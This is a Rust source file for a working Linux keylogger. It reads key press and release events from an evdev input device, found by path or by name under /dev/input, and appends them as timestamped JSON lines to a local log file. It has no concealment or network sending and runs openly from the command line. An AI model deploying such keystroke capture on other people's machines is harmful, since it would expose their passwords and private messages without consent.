use clap::Parser;
use ctrlc;
use evdev_rs::enums::{EventCode, EventType, EV_KEY};
use evdev_rs::{Device, DeviceWrapper, ReadFlag, TimeVal};
use serde::{Deserialize, Serialize};
use std::fs::{read_dir, File};
use std::io::{self, BufWriter, Write};
use std::os::unix::fs::FileTypeExt;
use std::process;
use std::sync::{Arc, Mutex};

#[derive(Parser, Debug)]
pub struct KeyLoggerArguments {
    #[arg(long = "device", short = 'd')]
    device: String,

    #[arg(long = "output-path", short = 'o', default_value = "./keylogger.log")]
    output_path: String,
}

#[allow(non_camel_case_types)]
#[derive(Copy, Clone, Debug, PartialEq, Eq, Hash, PartialOrd, Ord, Serialize, Deserialize)]
enum KeyEventAction {
    KEY_RELEASE = 0,
    KEY_PRESS = 1,
    KEY_REPEAT = 2,
}

impl KeyEventAction {
    pub const fn from_int(code: i32) -> Option<KeyEventAction> {
        match code {
            0 => Some(KeyEventAction::KEY_RELEASE),
            1 => Some(KeyEventAction::KEY_PRESS),
            2 => Some(KeyEventAction::KEY_REPEAT),
            _ => None,
        }
    }
}

#[derive(Copy, Clone, Debug, PartialEq, Eq, Hash, Serialize, Deserialize)]
struct KeyLogEvent {
    time: TimeVal,
    action: KeyEventAction,
    code: EV_KEY,
}

pub fn run_keylogger(args: KeyLoggerArguments) {
    let device = get_device(&args.device).unwrap();

    let out = File::options()
        .append(true)
        .create(true)
        .open(args.output_path)
        .expect("Unable to open output file");
    let out_writer = Arc::new(Mutex::new(BufWriter::new(out)));

    let auto_flush_writer = Arc::clone(&out_writer);
    ctrlc::set_handler(move || {
        let mut out_writer = auto_flush_writer.lock().unwrap();
        out_writer.flush().expect("Fail to flush log file");
        process::exit(0);
    })
    .expect("Fail to setup ctrl-c handler");

    loop {
        if let Ok(ev) = device.next_event(ReadFlag::NORMAL).map(|val| val.1) {
            if ev.event_type() != Some(EventType::EV_KEY) {
                continue;
            }

            let action = KeyEventAction::from_int(ev.value);
            if action != Some(KeyEventAction::KEY_PRESS)
                && action != Some(KeyEventAction::KEY_RELEASE)
            {
                continue;
            }

            if let EventCode::EV_KEY(event_code) = ev.event_code {
                let key_log_event = KeyLogEvent {
                    time: ev.time,
                    action: action.unwrap(),
                    code: event_code,
                };
                let serialized_event =
                    serde_json::to_string(&key_log_event).expect("Fail to serialize event");

                let mut out_writer = out_writer.lock().unwrap();
                out_writer
                    .write_all(serialized_event.as_bytes())
                    .expect("Fail to write key event");
                out_writer.write(b"\n").unwrap();
            }
        }
    }
}

fn get_device(device_path_or_name: &str) -> Result<Device, std::io::Error> {
    if let Ok(device) = Device::new_from_path(device_path_or_name) {
        return Ok(device);
    }

    let paths = read_dir("/dev/input")?;
    for path in paths {
        if let Ok(entry) = path {
            let file_type = entry.file_type();

            if file_type.is_ok_and(|t| t.is_char_device()) {
                if let Ok(device) = Device::new_from_path(entry.path()) {
                    if device.name().is_some_and(|n| n == device_path_or_name) {
                        return Ok(device);
                    }
                }
            }
        }
    }

    Err(io::Error::new(
        io::ErrorKind::NotFound,
        "Fail to find device by name",
    ))
}
